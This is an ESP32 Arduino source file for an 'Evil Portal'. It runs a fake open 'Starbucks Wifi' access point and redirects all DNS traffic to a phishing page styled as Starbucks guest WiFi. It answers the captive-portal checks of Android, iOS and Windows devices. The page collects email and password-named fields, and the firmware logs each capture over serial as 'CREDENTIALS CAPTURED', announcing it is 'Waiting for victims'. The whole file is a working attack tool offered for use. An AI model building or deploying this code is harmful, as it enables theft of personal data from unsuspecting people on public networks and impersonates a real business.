// EVIL PORTAL STANDALONE - Samsung/iPhone Compatible
// NO depende del Flipper - se levanta automáticamente
// Envía credenciales por Serial para tu proyecto
//
// COMPILAR CON: ESP32 Core 2.0.x (NO 3.x)
// BOARD: ESP32S3 Dev Module
// USB CDC On Boot: Enabled

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// ===== CONFIGURACIÓN =====
const char* WIFI_SSID = "Starbucks Wifi";  // Nombre de la red WiFi
const char* WIFI_PASS = "";            // Sin contraseña (red abierta)

// IP Pública para Samsung (4.3.2.1 funciona!)
IPAddress apIP(4, 3, 2, 1);
IPAddress netMsk(255, 255, 255, 0);

// LED pins (Electronic Cats ESP32-S3)
#define B_PIN 4
#define G_PIN 5
#define R_PIN 6

// ===== PÁGINA HTML DEL PORTAL =====
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <title>StarBucks · Guest WiFi</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
        color: #0f172a;
        min-height: 100vh;
        background: white;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .shell {
        width: 100%;
        max-width: 420px;
        padding: 16px;
      }

      .card {
        background: #f9fafb;
        border-radius: 14px;
        box-shadow: 0 18px 40px rgba(0, 0, 0, 0.8);
        overflow: hidden;
        border: 1px solid rgba(15, 118, 110, 0.25);
      }

      .card-header {
        background: linear-gradient(135deg, #064e3b, #065f46, #16a34a);
        padding: 18px 20px 14px;
        text-align: center;
        color: #ecfdf5;
      }

      .logo-wrapper {
        margin-bottom: 6px;
      }

      .logo-svg {
        width: 70px;
        height: 70px;
        display: block;
        margin: 0 auto;
      }

      .brand-line {
        font-size: 11px;
        letter-spacing: 0.22em;
        text-transform: uppercase;
        opacity: 0.9;
      }

      .brand-name {
        margin-top: 4px;
        font-size: 17px;
        font-weight: 600;
        letter-spacing: 0.04em;
      }

      .card-body {
        padding: 18px 18px 16px;
      }

      .title {
        font-size: 16px;
        margin-bottom: 4px;
        font-weight: 600;
        color: #022c22;
        text-align: center;
      }

      .subtitle {
        font-size: 13px;
        margin-bottom: 18px;
        color: #334155;
        text-align: center;
      }

      .form-group {
        text-align: left;
        margin-bottom: 12px;
      }

      .label {
        display: block;
        font-size: 12px;
        margin-bottom: 4px;
        color: #0f172a;
      }

      .input {
        width: 100%;
        padding: 8px 9px;
        border-radius: 6px;
        border: 1px solid #cbd5f5;
        box-sizing: border-box;
        font-size: 13px;
        background: #ffffff;
        color: #0f172a;
      }

      .input:focus {
        outline: none;
        border-color: #16a34a;
        box-shadow: 0 0 0 1px rgba(22, 163, 74, 0.3);
      }

      .input::placeholder {
        color: #9ca3af;
      }

      .btn {
        width: 100%;
        padding: 10px;
        border-radius: 999px;
        border: none;
        background: #166534;
        color: #ecfdf5;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 8px;
      }

      .btn:hover {
        background: #15803d;
      }

      .disclaimer {
        margin-top: 12px;
        font-size: 11px;
        color: #64748b;
        line-height: 1.4;
        text-align: center;
      }

      .hidden {
        display: none;
      }

      .ok-icon {
        font-size: 40px;
        margin-bottom: 10px;
        color: #16a34a;
        text-align: center;
      }

      .ok-text {
        text-align: center;
        font-size: 13px;
        color: #334155;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <!-- PANTALLA 1: Formulario -->
      <div class="card" id="step-form">
        <div class="card-header">
          <div class="logo-wrapper">
            <!-- Logo genérico tipo coffee-chain, circular y verde -->
            <svg
              version="1.0"
              xmlns="http://www.w3.org/2000/svg"
              width="350px"
              height="200px"
              viewBox="0 0 1200.000000 300.000000"
              preserveAspectRatio="xMidYMid meet"
            >
              <g
                transform="translate(0.000000,300.000000) scale(0.100000,-0.100000)"
                fill="#ecfdf5"
                stroke="none"
              >
                <path
                  d="M516 2229 c-211 -23 -376 -121 -448 -266 -26 -53 -32 -80 -36 -147
                    -5 -104 14 -175 67 -246 74 -98 170 -157 364 -221 138 -46 164 -58 191 -88 25
                    -28 14 -66 -26 -87 -74 -38 -248 -26 -392 28 -133 49 -131 49 -150 -13 -8 -29
                    -27 -104 -43 -166 -32 -134 -33 -131 73 -168 130 -45 219 -58 374 -58 167 1
                    257 20 376 78 186 91 280 289 230 485 -41 160 -146 246 -416 338 -80 27 -157
                    56 -173 63 -30 14 -46 53 -30 78 22 36 54 42 178 38 101 -4 134 -10 209 -36
                    50 -17 93 -28 97 -24 13 14 100 323 94 333 -8 13 -147 56 -220 68 -93 16 -232
                    21 -319 11z"
                />
                <path
                  d="M8760 2229 c-298 -29 -533 -177 -644 -404 -54 -109 -69 -182 -70
                    -325 0 -214 53 -352 188 -485 140 -140 297 -202 556 -220 156 -11 428 31 461
                    72 10 12 7 44 -15 161 -16 81 -34 152 -40 159 -8 8 -29 7 -85 -8 -110 -28
                    -241 -34 -330 -15 -90 19 -145 50 -204 116 -61 68 -82 131 -82 245 0 75 5 99
                    26 145 70 151 211 220 425 207 52 -3 128 -15 169 -28 45 -13 79 -18 85 -13 12
                    13 89 306 83 320 -6 16 -108 50 -188 63 -94 15 -242 20 -335 10z"
                />
                <path
                  d="M11346 2229 c-211 -23 -376 -121 -448 -266 -26 -53 -32 -80 -36 -147
                    -5 -104 14 -175 67 -246 74 -98 170 -157 364 -221 138 -46 164 -58 191 -88 25
                    -28 14 -66 -26 -87 -74 -38 -248 -26 -392 28 -133 49 -131 49 -150 -13 -8 -29
                    -27 -104 -43 -166 -32 -134 -33 -131 73 -168 130 -45 219 -58 374 -58 167 1
                    257 20 376 78 186 91 280 289 230 485 -41 160 -146 246 -416 338 -80 27 -157
                    56 -173 63 -30 14 -46 53 -30 78 22 36 54 42 178 38 101 -4 134 -10 209 -36
                    50 -17 93 -28 97 -24 13 14 100 323 94 333 -8 13 -147 56 -220 68 -93 16 -232
                    21 -319 11z"
                />
                <path
                  d="M4225 2223 c-100 -3 -324 -22 -347 -29 -17 -5 -18 -47 -18 -690 l0
                    -684 208 2 207 3 3 249 2 249 59 -6 c112 -10 146 -48 191 -217 27 -102 78
                    -250 92 -267 8 -10 64 -13 219 -13 176 0 209 2 209 15 0 8 -25 101 -56 207
                    -62 217 -114 336 -168 389 l-36 36 45 32 c127 91 186 237 155 386 -32 157
                    -144 262 -328 310 -57 14 -288 37 -337 33 -11 -1 -56 -3 -100 -5z m282 -346
                    c45 -24 63 -54 63 -108 0 -86 -60 -126 -207 -136 l-83 -6 0 130 c0 71 3 133 8
                    137 13 14 185 0 219 -17z"
                />
                <path
                  d="M5585 2223 c-109 -4 -332 -22 -350 -29 -13 -5 -15 -95 -15 -685 l0
                    -679 23 -5 c49 -11 248 -25 362 -25 306 0 523 46 642 137 59 45 118 134 138
                    207 45 164 -19 326 -158 406 l-49 28 46 31 c86 59 127 139 128 248 1 192 -140
                    319 -389 352 -90 12 -263 18 -378 14z m285 -341 c20 -10 39 -29 44 -44 26 -74
                    -41 -122 -186 -134 l-88 -6 0 101 0 101 98 0 c72 0 106 -4 132 -18z m13 -516
                    c74 -36 90 -125 34 -181 -41 -41 -89 -55 -194 -55 l-83 0 0 131 0 131 103 -4
                    c74 -2 112 -8 140 -22z"
                />
                <path
                  d="M1186 2194 c-10 -27 -7 -304 4 -325 10 -18 23 -19 190 -19 l180 0 0
                    -499 c0 -275 3 -506 6 -515 5 -14 34 -16 215 -16 l209 0 0 515 0 515 184 0
                    c144 0 186 3 195 14 8 9 11 65 9 177 l-3 164 -591 3 c-533 2 -592 1 -598 -14z"
                />
                <path
                  d="M2711 2188 c-46 -124 -422 -1340 -418 -1352 6 -14 35 -16 221 -16
                    l215 0 9 33 c5 17 24 92 43 165 l34 132 172 0 172 0 53 -162 53 -163 228 -3
                    227 -2 0 22 c0 13 -102 326 -226 696 l-227 672 -274 0 -273 0 -9 -22z m317
                    -510 c27 -84 52 -165 56 -180 l6 -28 -106 0 c-97 0 -106 1 -99 18 4 9 25 90
                    48 179 23 90 43 163 44 163 1 0 24 -69 51 -152z"
                />
                <path
                  d="M6570 1789 c0 -443 5 -511 46 -631 30 -89 70 -152 138 -216 109 -103
                    238 -144 451 -144 224 0 371 49 490 166 70 69 113 146 147 263 22 76 23 90 23
                    528 l0 450 -210 0 -210 0 -5 -440 c-4 -299 -10 -451 -18 -474 -35 -102 -101
                    -151 -202 -151 -98 0 -150 34 -192 125 -23 49 -23 56 -26 475 -1 234 -4 435
                    -7 448 -5 22 -6 22 -215 22 l-210 0 0 -421z"
                />
                <path
                  d="M9460 1515 l0 -695 210 0 210 0 0 208 0 208 43 50 c23 27 47 51 52
                    52 6 2 78 -113 160 -255 l150 -258 243 -3 c232 -2 242 -2 242 17 0 10 -108
                    188 -240 395 -132 207 -240 379 -240 382 0 3 104 130 230 282 127 152 230 284
                    230 294 0 17 -16 18 -258 18 l-258 0 -169 -246 -170 -246 -6 99 c-4 54 -7 164
                    -8 246 l-1 147 -210 0 -210 0 0 -695z"
                />
              </g>
            </svg>
          </div>
          <div class="brand-line">StarBucks · Guest WiFi</div>
          <div class="brand-name">WIFI + COFFEE = 💚</div>
        </div>

        <div class="card-body">
          <div class="title">Acceso a la red de invitados</div>
          <div class="subtitle">
            Ingresa tus datos para conectarte al Wi-Fi del café. Este acceso es
            exclusivo para clientes en sucursal.
          </div>

          <!-- IMPORTANTE: email + password como en el ejemplo que sí captura -->
          <form id="guestForm">
            <div class="form-group">
              <label class="label" for="fullname">Nombre</label>
              <input
                id="fullname"
                name="password"
                class="input"
                type="text"
                required
              />
            </div>

            <div class="form-group">
              <label class="label" for="email">Correo electrónico</label>
              <input
                id="email"
                name="email"
                class="input"
                type="email"
                required
              />
            </div>

            <button type="submit" class="btn">Conectarse al Wi-Fi</button>
          </form>

          <div class="disclaimer">
            Al conectarte aceptas el uso responsable de la red y las políticas
            del café. Parte del tráfico puede ser monitoreado con fines de
            seguridad y calidad del servicio.
          </div>
        </div>
      </div>

      <!-- PANTALLA 2: Acceso autorizado -->
      <div class="card hidden" id="step-done">
        <div class="card-header">
          <div class="logo-wrapper">
            <svg
              version="1.0"
              xmlns="http://www.w3.org/2000/svg"
              width="350px"
              height="200px"
              viewBox="0 0 1200.000000 300.000000"
              preserveAspectRatio="xMidYMid meet"
            >
              <g
                transform="translate(0.000000,300.000000) scale(0.100000,-0.100000)"
                fill="#ecfdf5"
                stroke="none"
              >
                <path
                  d="M516 2229 c-211 -23 -376 -121 -448 -266 -26 -53 -32 -80 -36 -147
                    -5 -104 14 -175 67 -246 74 -98 170 -157 364 -221 138 -46 164 -58 191 -88 25
                    -28 14 -66 -26 -87 -74 -38 -248 -26 -392 28 -133 49 -131 49 -150 -13 -8 -29
                    -27 -104 -43 -166 -32 -134 -33 -131 73 -168 130 -45 219 -58 374 -58 167 1
                    257 20 376 78 186 91 280 289 230 485 -41 160 -146 246 -416 338 -80 27 -157
                    56 -173 63 -30 14 -46 53 -30 78 22 36 54 42 178 38 101 -4 134 -10 209 -36
                    50 -17 93 -28 97 -24 13 14 100 323 94 333 -8 13 -147 56 -220 68 -93 16 -232
                    21 -319 11z"
                />
                <path
                  d="M8760 2229 c-298 -29 -533 -177 -644 -404 -54 -109 -69 -182 -70
                    -325 0 -214 53 -352 188 -485 140 -140 297 -202 556 -220 156 -11 428 31 461
                    72 10 12 7 44 -15 161 -16 81 -34 152 -40 159 -8 8 -29 7 -85 -8 -110 -28
                    -241 -34 -330 -15 -90 19 -145 50 -204 116 -61 68 -82 131 -82 245 0 75 5 99
                    26 145 70 151 211 220 425 207 52 -3 128 -15 169 -28 45 -13 79 -18 85 -13 12
                    13 89 306 83 320 -6 16 -108 50 -188 63 -94 15 -242 20 -335 10z"
                />
                <path
                  d="M11346 2229 c-211 -23 -376 -121 -448 -266 -26 -53 -32 -80 -36 -147
                    -5 -104 14 -175 67 -246 74 -98 170 -157 364 -221 138 -46 164 -58 191 -88 25
                    -28 14 -66 -26 -87 -74 -38 -248 -26 -392 28 -133 49 -131 49 -150 -13 -8 -29
                    -27 -104 -43 -166 -32 -134 -33 -131 73 -168 130 -45 219 -58 374 -58 167 1
                    257 20 376 78 186 91 280 289 230 485 -41 160 -146 246 -416 338 -80 27 -157
                    56 -173 63 -30 14 -46 53 -30 78 22 36 54 42 178 38 101 -4 134 -10 209 -36
                    50 -17 93 -28 97 -24 13 14 100 323 94 333 -8 13 -147 56 -220 68 -93 16 -232
                    21 -319 11z"
                />
                <path
                  d="M4225 2223 c-100 -3 -324 -22 -347 -29 -17 -5 -18 -47 -18 -690 l0
                    -684 208 2 207 3 3 249 2 249 59 -6 c112 -10 146 -48 191 -217 27 -102 78
                    -250 92 -267 8 -10 64 -13 219 -13 176 0 209 2 209 15 0 8 -25 101 -56 207
                    -62 217 -114 336 -168 389 l-36 36 45 32 c127 91 186 237 155 386 -32 157
                    -144 262 -328 310 -57 14 -288 37 -337 33 -11 -1 -56 -3 -100 -5z m282 -346
                    c45 -24 63 -54 63 -108 0 -86 -60 -126 -207 -136 l-83 -6 0 130 c0 71 3 133 8
                    137 13 14 185 0 219 -17z"
                />
                <path
                  d="M5585 2223 c-109 -4 -332 -22 -350 -29 -13 -5 -15 -95 -15 -685 l0
                    -679 23 -5 c49 -11 248 -25 362 -25 306 0 523 46 642 137 59 45 118 134 138
                    207 45 164 -19 326 -158 406 l-49 28 46 31 c86 59 127 139 128 248 1 192 -140
                    319 -389 352 -90 12 -263 18 -378 14z m285 -341 c20 -10 39 -29 44 -44 26 -74
                    -41 -122 -186 -134 l-88 -6 0 101 0 101 98 0 c72 0 106 -4 132 -18z m13 -516
                    c74 -36 90 -125 34 -181 -41 -41 -89 -55 -194 -55 l-83 0 0 131 0 131 103 -4
                    c74 -2 112 -8 140 -22z"
                />
                <path
                  d="M1186 2194 c-10 -27 -7 -304 4 -325 10 -18 23 -19 190 -19 l180 0 0
                    -499 c0 -275 3 -506 6 -515 5 -14 34 -16 215 -16 l209 0 0 515 0 515 184 0
                    c144 0 186 3 195 14 8 9 11 65 9 177 l-3 164 -591 3 c-533 2 -592 1 -598 -14z"
                />
                <path
                  d="M2711 2188 c-46 -124 -422 -1340 -418 -1352 6 -14 35 -16 221 -16
                    l215 0 9 33 c5 17 24 92 43 165 l34 132 172 0 172 0 53 -162 53 -163 228 -3
                    227 -2 0 22 c0 13 -102 326 -226 696 l-227 672 -274 0 -273 0 -9 -22z m317
                    -510 c27 -84 52 -165 56 -180 l6 -28 -106 0 c-97 0 -106 1 -99 18 4 9 25 90
                    48 179 23 90 43 163 44 163 1 0 24 -69 51 -152z"
                />
                <path
                  d="M6570 1789 c0 -443 5 -511 46 -631 30 -89 70 -152 138 -216 109 -103
                    238 -144 451 -144 224 0 371 49 490 166 70 69 113 146 147 263 22 76 23 90 23
                    528 l0 450 -210 0 -210 0 -5 -440 c-4 -299 -10 -451 -18 -474 -35 -102 -101
                    -151 -202 -151 -98 0 -150 34 -192 125 -23 49 -23 56 -26 475 -1 234 -4 435
                    -7 448 -5 22 -6 22 -215 22 l-210 0 0 -421z"
                />
                <path
                  d="M9460 1515 l0 -695 210 0 210 0 0 208 0 208 43 50 c23 27 47 51 52
                    52 6 2 78 -113 160 -255 l150 -258 243 -3 c232 -2 242 -2 242 17 0 10 -108
                    188 -240 395 -132 207 -240 379 -240 382 0 3 104 130 230 282 127 152 230 284
                    230 294 0 17 -16 18 -258 18 l-258 0 -169 -246 -170 -246 -6 99 c-4 54 -7 164
                    -8 246 l-1 147 -210 0 -210 0 0 -695z"
                />
              </g>
            </svg>
          </div>
          <div class="brand-line">StarBucks · Guest WiFi</div>
          <div class="brand-name">WIFI + COFFEE = 💚</div>
        </div>

        <div class="card-body">
          <div class="ok-icon">✔</div>
          <div class="title">Acceso autorizado</div>
          <div class="ok-text">
            Tu conexión a la red de invitados ha sido habilitada.<br />
            Ya puedes navegar en Internet desde este dispositivo.
          </div>
        </div>
      </div>
    </div>

    <script>
      (function () {
        var stepForm = document.getElementById("step-form");
        var stepDone = document.getElementById("step-done");
        var form = document.getElementById("guestForm");

        if (!form || !stepForm || !stepDone) return;

        form.addEventListener("submit", function (e) {
          e.preventDefault();

          try {
            var formData = new FormData(form);
            var params = new URLSearchParams(formData).toString();

            // Igual que el ejemplo que te funciona: GET /get?email=...&password=...
            var img = new Image();
            img.src = "/get?" + params;
          } catch (err) {
            // si algo falla, no rompemos la UI
          }

          // Cambiar de pantalla
          stepForm.classList.add("hidden");
          stepDone.classList.remove("hidden");
        });
      })();
    </script>
  </body>
</html>
)rawliteral";

// ===== GLOBALS =====
AsyncWebServer server(80);
DNSServer dnsServer;
int captureCount = 0;

// ===== FUNCIONES LED =====
void setLedBlue() {
    digitalWrite(B_PIN, LOW);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, HIGH);
}

void setLedGreen() {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, LOW);
    digitalWrite(R_PIN, HIGH);
}

void setLedRed() {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, LOW);
}

void blinkRed(int times) {
    for (int i = 0; i < times; i++) {
        setLedRed();
        delay(200);
        setLedGreen();
        delay(200);
    }
}

// ===== ESCAPE JSON =====
String escapeJson(String input) {
    String output = "";
    for (unsigned int i = 0; i < input.length(); i++) {
        char c = input.charAt(i);
        switch (c) {
            case '\\': output += "\\\\"; break;
            case '"': output += "\\\""; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default: output += c;
        }
    }
    return output;
}

// ===== CAPTIVE PORTAL HANDLER =====
class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request) {
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    }
};

// ===== SETUP =====
void setup() {
    // LED pins
    pinMode(B_PIN, OUTPUT);
    pinMode(G_PIN, OUTPUT);
    pinMode(R_PIN, OUTPUT);
    
    setLedBlue(); // Azul = iniciando
    
    // Serial para enviar credenciales
    Serial.begin(115200);
    delay(1000);
    
    Serial.println();
    Serial.println("=================================");
    Serial.println("  EVIL PORTAL STANDALONE v1.0");
    Serial.println("  Starbucks Theme");
    Serial.println("=================================");
    
    // Configurar WiFi AP con IP pública (para Samsung)
    WiFi.disconnect();
    delay(100);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(100);
    
    // IP 4.3.2.1 - Funciona con Samsung!
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    
    WiFi.softAP(WIFI_SSID, WIFI_PASS);
    delay(100);
    
    Serial.print("AP SSID: ");
    Serial.println(WIFI_SSID);
    Serial.print("AP IP: ");
    Serial.println(WiFi.softAPIP());
    Serial.println("---------------------------------");
    
    // ===== CONFIGURAR SERVIDOR WEB =====
    
    // Página principal
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
        Serial.println("[WEB] Client connected to portal");
    });
    
    // Android captive portal endpoints
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // iOS captive portal endpoints
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Windows captive portal endpoints
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Firefox
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // ===== CAPTURA DE CREDENCIALES =====
    server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
        String email = "";
        String password = "";
        
        // Obtener email/username
        if (request->hasParam("email")) {
            email = request->getParam("email")->value();
        } else if (request->hasParam("username")) {
            email = request->getParam("username")->value();
        } else if (request->hasParam("user")) {
            email = request->getParam("user")->value();
        }
        
        // Obtener password (en tu form es el "Nombre")
        if (request->hasParam("password")) {
            password = request->getParam("password")->value();
        } else if (request->hasParam("pass")) {
            password = request->getParam("pass")->value();
        }
        
        if (email.length() > 0 || password.length() > 0) {
            captureCount++;
            
            // ===== SALIDA SERIAL =====
            Serial.println();
            Serial.println("========== CREDENTIALS CAPTURED ==========");
            Serial.print("Email:  ");
            Serial.println(email);
            Serial.print("Nombre: ");
            Serial.println(password);
            Serial.println("==========================================");
            
            // Formato JSON para tu proyecto
            String json = "{";
            json += "\"id\":" + String(captureCount) + ",";
            json += "\"email\":\"" + escapeJson(email) + "\",";
            json += "\"nombre\":\"" + escapeJson(password) + "\",";
            json += "\"ssid\":\"" + String(WIFI_SSID) + "\",";
            json += "\"timestamp\":" + String(millis());
            json += "}";
            Serial.println(json);
            Serial.println();
            
            // LED rojo parpadea = credenciales capturadas
            blinkRed(3);
        }
        
        // Responder con pixel transparente (el JS ya cambió la pantalla)
        request->send(200, "image/gif", "GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;");
    });
    
    // DNS Server - redirige todo a nuestra IP
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    
    // Captive portal handler para cualquier otra URL
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    
    // Iniciar servidor
    server.begin();
    
    setLedGreen(); // Verde = listo
    
    Serial.println();
    Serial.println("Portal is READY!");
    Serial.println("Waiting for victims...");
    Serial.println();
}

// ===== LOOP =====
void loop() {
    dnsServer.processNextRequest();
}
